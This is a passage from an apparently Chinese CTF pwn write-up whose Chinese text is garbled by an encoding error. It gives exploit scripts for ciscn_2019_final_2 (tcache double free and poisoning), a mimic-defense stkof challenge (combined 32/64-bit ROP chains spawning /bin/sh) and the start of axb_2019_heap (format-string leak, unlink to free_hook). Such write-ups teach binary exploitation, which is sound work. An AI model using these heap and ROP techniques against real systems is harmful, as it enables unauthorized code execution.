</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>system</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x400</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># _flags,size,fd,bk,write_base,write_ptr,padding,fake_vtable</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>useless</span> <span class=o>+</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span><span class=mh>0x61</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>io_list_all</span><span class=o>-</span><span class=mh>0x10</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0xd8</span><span class=o>-</span><span class=mh>0x30</span><span class=p>),</span><span class=n>heap</span><span class=o>+</span><span class=mh>0xd0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice :&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=ciscn_2019_final_2>ciscn_2019_final_2</h3><p>æœ¬é¢˜éœ€è¦å°†è¯»å…¥çš„ <code>flag</code> çš„ <code>fd</code> æ”¹ä¸º 666ã€‚</p><p>å­˜åœ¨ tcache double free æ¼æ´ï¼Œé¦–å…ˆåˆ†é…å¤šä¸ª <code>short</code>ï¼Œåˆ©ç”¨ double free æ³„éœ²å †åœ°å€ã€‚ç„¶å tcache æŠ•æ¯’ï¼Œä¼ªé€  <code>chunk0</code> å¤§å°ï¼Œå¹¶é‡Šæ”¾è¿›å…¥ unsorted bin æ³„éœ² libcã€‚æ³¨æ„é‡Šæ”¾å‰å…ˆå¡«æ»¡ tcache æ‰èƒ½è¿›å…¥ unsorted binã€‚</p><p>æ¥ä¸‹æ¥ç»§ç»­æŠ•æ¯’ä½¿ <code>int</code> çš„ <code>fd</code> æŒ‡å‘ <code>fileno</code>ï¼Œå†æ¬¡ double free æ³„éœ² <code>chunk0</code> çš„ <code>mem</code> æŒ‡é’ˆåœ°å€ã€‚æœ€åæŠ•æ¯’æŒ‡å‘ <code>chunk0</code> çš„ <code>mem</code> æŒ‡é’ˆåœ°å€ï¼Œå†ç”³è¯·ä¸‰æ¬¡å°±å¯ä»¥ä¿®æ”¹ <code>fileno</code> äº†ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x30</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x20</span><span class=p>)</span> <span class=c1># total size: 0x90</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x20</span><span class=p>)</span> <span class=c1># prevent merging</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x30</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;number :&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chunk0</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>))</span><span class=o>-</span><span class=mh>0xa0</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;chunk0&#39;</span><span class=p>,</span><span class=n>chunk0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>chunk0</span><span class=p>)</span> <span class=c1># poisoning</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x91</span><span class=p>)</span> <span class=c1># chunk0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span> <span class=c1># fill tcache</span>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># unsorted</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;number :&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>))</span><span class=o>-</span><span class=mi>96</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fileno</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdin_&#39;</span><span class=p>]</span><span class=o>+</span><span class=mh>0x70</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>fileno</span><span class=p>)</span> <span class=c1># poisoning</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x30</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;number :&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chunk0_mem</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>))</span><span class=o>-</span><span class=mh>0x30</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>chunk0_mem</span><span class=p>)</span> <span class=c1># poisoning</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>666</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=mi>4</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=å¼ºç½‘æ¯_æ‹Ÿæ€_stkof>å¼ºç½‘æ¯_æ‹Ÿæ€_stkof</h3><p>é‡‡ç”¨äº†æ‹Ÿæ€é˜²å¾¡ï¼Œç®€å•æ¥è¯´å°±æ˜¯è¦ç”¨åŒä¸€ä¸ªè„šæœ¬åŒæ—¶åœ¨ 32 ä½å’Œ 64 ä½ç¨‹åºä¸Š getshell ä¸”ä¸¤ä¸ªç¨‹åºçš„è¾“å‡ºå¿…é¡»ç›¸åŒã€‚</p><p>é¦–å…ˆæ£€æŸ¥ä¸¤ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ¼æ´éƒ½æ˜¯ç®€å•çš„æ ˆæº¢å‡ºå¹¶ä¸”ç©ºé—´å¾ˆå¤§ã€‚åŒºåˆ«åœ¨äºå¯ä»¥æº¢å‡ºçš„é•¿åº¦ç›¸å·® 8 å­—èŠ‚ï¼Œè¿™ 8 å­—èŠ‚åº”è¯¥å°±æ˜¯èƒ½å¤Ÿç”¨åŒä¸€ä¸ªè„šæœ¬çš„å…³é”®æ‰€åœ¨ã€‚</p><p>å®¹æ˜“æƒ³åˆ°åˆ©ç”¨å¸¸è§„ ret2syscallï¼Œåˆ†åˆ«å†™å‡º 32 ä½å’Œ 64 ä½è„šæœ¬ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>pop_eax</span> <span class=o>=</span> <span class=mh>0x80a8af6</span>
</span></span><span class=line><span class=cl><span class=n>pop_dcb</span> <span class=o>=</span> <span class=mh>0x806e9f1</span>
</span></span><span class=line><span class=cl><span class=n>int_80</span> <span class=o>=</span> <span class=mh>0x80495a3</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=mh>0x80d7000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chain86</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x10c</span><span class=o>+</span><span class=mi>4</span><span class=p>),</span>
</span></span><span class=line><span class=cl>	<span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>	<span class=n>pop_dcb</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>data</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>pop_dcb</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>data</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>pop_eax</span><span class=p>,</span><span class=mh>0xb</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>int_80</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=n>chain86</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;?&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>pop_rax</span> <span class=o>=</span> <span class=mh>0x43b97c</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x4005f6</span>
</span></span><span class=line><span class=cl><span class=n>pop_rsi</span> <span class=o>=</span> <span class=mh>0x405895</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdx</span> <span class=o>=</span> <span class=mh>0x43b9d5</span>
</span></span><span class=line><span class=cl><span class=n>syscall</span> <span class=o>=</span> <span class=mh>0x461645</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=mh>0x6a4e40</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chain64</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x110</span><span class=o>+</span><span class=mi>8</span><span class=p>),</span>
</span></span><span class=line><span class=cl>	<span class=n>pop_rax</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>pop_rsi</span><span class=p>,</span><span class=n>data</span><span class=p>,</span><span class=n>pop_rdx</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>syscall</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>pop_rax</span><span class=p>,</span><span class=mi>59</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>data</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>pop_rsi</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>pop_rdx</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>syscall</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=n>chain64</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;?&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>é‚£ä¹ˆæ€ä¹ˆæŠŠä¸¤è€…åˆå¹¶å‘¢ï¼Ÿè¿™å°±éœ€è¦ç”¨åˆ° 8 å­—èŠ‚çš„æ ˆæº¢å‡ºé•¿åº¦å·®ï¼Œåœ¨è¿™ 8 å­—èŠ‚ä¸­ï¼Œæˆ‘ä»¬åˆ†åˆ«è°ƒæ•´ 32 ä½ç¨‹åºå’Œ 64 ä½ç¨‹åºçš„ <code>esp</code> å’Œ <code>rsp</code> æŒ‡é’ˆï¼Œä½¿å¾—ç»è¿‡è°ƒæ•´åæ ˆä¸Šçš„è¿”å›åœ°å€æŒ‡å‘ payload çš„ä¸åŒéƒ¨åˆ†ã€‚</p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ ˆå˜é‡åœ¨ 32 ä½ä¸‹ä½äº <code>esp+0xc</code>ï¼Œåœ¨ 64 ä½ä¸‹ä½äº <code>rsp+0x0</code>ï¼Œåœ¨è®¡ç®—éœ€è¦å¡«å……çš„ padding æ—¶éœ€è¦è€ƒè™‘åˆ°è¿™ä¸€ç‚¹ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>pop_eax</span> <span class=o>=</span> <span class=mh>0x80a8af6</span>
</span></span><span class=line><span class=cl><span class=n>pop_dcb</span> <span class=o>=</span> <span class=mh>0x806e9f1</span>
</span></span><span class=line><span class=cl><span class=n>int_80</span> <span class=o>=</span> <span class=mh>0x80495a3</span>
</span></span><span class=line><span class=cl><span class=n>data86</span> <span class=o>=</span> <span class=mh>0x80d7000</span>
</span></span><span class=line><span class=cl><span class=n>read</span> <span class=o>=</span> <span class=mh>0x806c8e0</span>
</span></span><span class=line><span class=cl><span class=n>add_esp_20</span> <span class=o>=</span> <span class=mh>0x80a69f2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>offset86</span> <span class=o>=</span> <span class=mh>0x20</span><span class=o>-</span><span class=mh>0xc</span> <span class=c1># esp+0xc</span>
</span></span><span class=line><span class=cl><span class=n>chain86</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>offset86</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>read</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>pop_dcb</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>data86</span><span class=p>,</span><span class=mh>0x8</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>pop_dcb</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>data86</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>pop_eax</span><span class=p>,</span><span class=mh>0xb</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>int_80</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>payload86</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=n>chain86</span><span class=p>,</span><span class=n>word_size</span><span class=o>=</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pop_rax</span> <span class=o>=</span> <span class=mh>0x43b97c</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x4005f6</span>
</span></span><span class=line><span class=cl><span class=n>pop_rsi</span> <span class=o>=</span> <span class=mh>0x405895</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdx</span> <span class=o>=</span> <span class=mh>0x43b9d5</span>
</span></span><span class=line><span class=cl><span class=n>syscall</span> <span class=o>=</span> <span class=mh>0x461645</span>
</span></span><span class=line><span class=cl><span class=n>data64</span> <span class=o>=</span> <span class=mh>0x6a4e40</span>
</span></span><span class=line><span class=cl><span class=n>add_rsp_80</span> <span class=o>=</span> <span class=mh>0x40cd17</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>offset64</span> <span class=o>=</span> <span class=mh>0x80</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>payload86</span><span class=p>)</span> <span class=c1># rsp+0x0</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=nb>hex</span><span class=p>(</span><span class=n>offset64</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chain64</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>offset64</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>pop_rax</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>pop_rsi</span><span class=p>,</span><span class=n>data64</span><span class=p>,</span><span class=n>pop_rdx</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>syscall</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>pop_rax</span><span class=p>,</span><span class=mi>59</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>data64</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>pop_rsi</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>pop_rdx</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=n>syscall</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>payload64</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=n>chain64</span><span class=p>,</span><span class=n>word_size</span><span class=o>=</span><span class=mi>64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x110</span> <span class=o>+</span> <span class=p>(</span><span class=n>p32</span><span class=p>(</span><span class=n>add_esp_20</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;aaaa&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>add_rsp_80</span><span class=p>)</span> <span class=o>+</span> <span class=n>payload86</span> <span class=o>+</span> <span class=n>payload64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;?&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=axb_2019_heap>axb_2019_heap</h3><p>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²å †åœ°å€å’Œ libcã€‚éšåï¼Œå¯ä»¥å‘ç° <code>edit</code> æ—¶å­˜åœ¨ off by oneï¼Œæˆ‘ä»¬åœ¨æ„é€  unlink çš„ fake chunk æ—¶ï¼Œè¯¥æ¼æ´ä¼šå¯¼è‡´ä¿®æ”¹ä¸‹ä¸€ä¸ª chunk çš„ <code>prev_size</code> åä¼šè¦†ç›–æ‰å®ƒçš„ <code>size</code> å­—æ®µæœ€åä¸€ä¸ªå­—èŠ‚ã€‚ä½†æ˜¯åŒæ ·çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ‰‹åŠ¨æ¢å¤æœ€åä¸€ä¸ªå­—èŠ‚ã€‚ï¼Œè¿™é‡Œæ˜¯ <code>0xa0</code>ã€‚</p><p>æ¥ä¸‹æ¥å°±å¸¸è§„ unlinkï¼Œè¦†ç›– <code>free_hook</code> ä¸º <code>system</code>ï¼Œæ³¨æ„ç»´æŒåŸ <code>note</code> æ•°ç»„ç»“æ„ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;name:&#39;</span><span class=p>,</span><span class=s1>&#39;%11$p.%15$p&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span><span class=o>-</span><span class=mh>0x1186</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span><span class=o>-</span><span class=mh>0x20830</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;heap&#39;</span><span class=p>,</span><span class=n>heap</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>note</span> <span class=o>=</span> <span class=n>heap</span><span class=o>+</span><span class=mh>0x202060</span>
</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
